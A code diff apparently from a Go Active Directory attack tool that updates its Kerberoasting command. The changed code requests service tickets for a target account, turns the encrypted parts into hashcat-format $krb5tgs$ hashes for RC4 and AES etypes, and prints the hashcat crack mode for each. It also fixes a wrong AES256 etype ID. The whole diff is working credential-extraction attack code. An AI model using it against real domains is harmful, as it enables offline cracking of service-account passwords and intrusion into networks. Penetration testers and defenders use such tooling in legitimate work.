@@ -36,62 +36,72 @@ var helpKerberoastOptions = `
     Usage: ` + os.Args[0] + ` --kerberoast [options]
     ` + helpConnectionOptions + `
     options:
-          --spn	<SPN>             SPN used to request or forge a service ticket of format "service/FQDN"
-          --target <username>     Target username to request service ticket for
+          --target <SPN|SAN|UPN>  Target to kerberoast. Supports multiple formats such as service/fqdn, sAMAccountName and UPN."
+          --name <username>       Target username for output hash (default user)
           --krb5-conf <file>      Read krb5.conf file and use as config
-          --request-rc4           Ask for RC4 encrypted encPart of KDC REP, not the actual ticket (default false)
 `
 
 func handleKerberoast(args *userArgs) (err error) {
-	if args.targetUsername == "" {
-		fmt.Printf("Must specify a --target username for the --spn")
+	if args.spn == "" {
+		fmt.Println("Must specify a --target to kerberoast")
 		myFlags.Usage()
+		return
 	}
-	st, _, err := args.c.GetServiceTicket(args.spn)
+	st, _, err := args.c.GetServiceTicketExt(args.spn, args.dcDomain)
 	if err != nil {
 		log.Errorln(err)
 		return
 	}
 
-	h, err := extractHashFromST(st, args.targetUsername)
+	h, encType, err := extractHashFromST(st, args.targetUsername)
 	if err != nil {
 		log.Errorln(err)
 		return
 	}
 
-	//TODO improve output
 	fmt.Printf("%s\n", h)
-	fmt.Println("Crack with hashcat -m 13100 <hash.txt> <wordlist.txt>")
+	if !args.quiet {
+		switch encType {
+		case etypeID.RC4_HMAC:
+			fmt.Println("Crack with hashcat -m 13100 <hash.txt> <wordlist.txt>")
+		case etypeID.AES128_CTS_HMAC_SHA1_96:
+			fmt.Println("Crack with hashcat -m 19600 <hash.txt> <wordlist.txt>")
+		case etypeID.AES256_CTS_HMAC_SHA1_96:
+			fmt.Println("Crack with hashcat -m 19700 <hash.txt> <wordlist.txt>")
+		}
+	}
 
 	return
 }
 
-func extractHashFromST(st messages.Ticket, user string) (hash string, err error) {
+func extractHashFromST(st messages.Ticket, user string) (hash string, encType int32, err error) {
 	sb := strings.Builder{}
+	encType = st.EncPart.EType
 
 	sb.Write([]byte("$krb5tgs$"))
-	if st.EncPart.EType == etypeID.RC4_HMAC {
+	switch st.EncPart.EType {
+	case etypeID.RC4_HMAC:
 		sb.Write([]byte(strconv.Itoa(int(etypeID.RC4_HMAC)) + "$*"))
 		sb.Write([]byte(user + "$" + st.Realm + "$"))
 		sb.Write([]byte(strings.ReplaceAll(st.SName.PrincipalNameString(), ":", "~") + "*$"))
 		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[:16]) + "$"))
 		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[16:])))
-	} else if st.EncPart.EType == etypeID.AES128_CTS_HMAC_SHA1_96 {
+	case etypeID.AES128_CTS_HMAC_SHA1_96:
 		length := len(st.EncPart.Cipher)
 		sb.Write([]byte(strconv.Itoa(int(etypeID.AES128_CTS_HMAC_SHA1_96)) + "$"))
 		sb.Write([]byte(user + "$" + st.Realm + "$*"))
 		sb.Write([]byte(strings.ReplaceAll(st.SName.PrincipalNameString(), ":", "~") + "*$"))
 		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[length-12:]) + "$"))
 		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[:length-12])))
-	} else if st.EncPart.EType == etypeID.AES256_CTS_HMAC_SHA1_96 {
+	case etypeID.AES256_CTS_HMAC_SHA1_96:
 		length := len(st.EncPart.Cipher)
-		sb.Write([]byte(strconv.Itoa(int(etypeID.AES128_CTS_HMAC_SHA1_96)) + "$"))
+		sb.Write([]byte(strconv.Itoa(int(etypeID.AES256_CTS_HMAC_SHA1_96)) + "$"))
 		sb.Write([]byte(user + "$" + st.Realm + "$*"))
 		sb.Write([]byte(strings.ReplaceAll(st.SName.PrincipalNameString(), ":", "~") + "*$"))
 		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[length-12:]) + "$"))
 		sb.Write([]byte(hex.EncodeToString(st.EncPart.Cipher[:length-12])))
-	} else {
-		err = fmt.Errorf("Haven't implemented parsing for encryption type: %d", st.EncPart.EType)
+	default:
+		err = fmt.Errorf("haven't implemented parsing for encryption type: %d", st.EncPart.EType)
 		return
 	}
 	hash = sb.String()
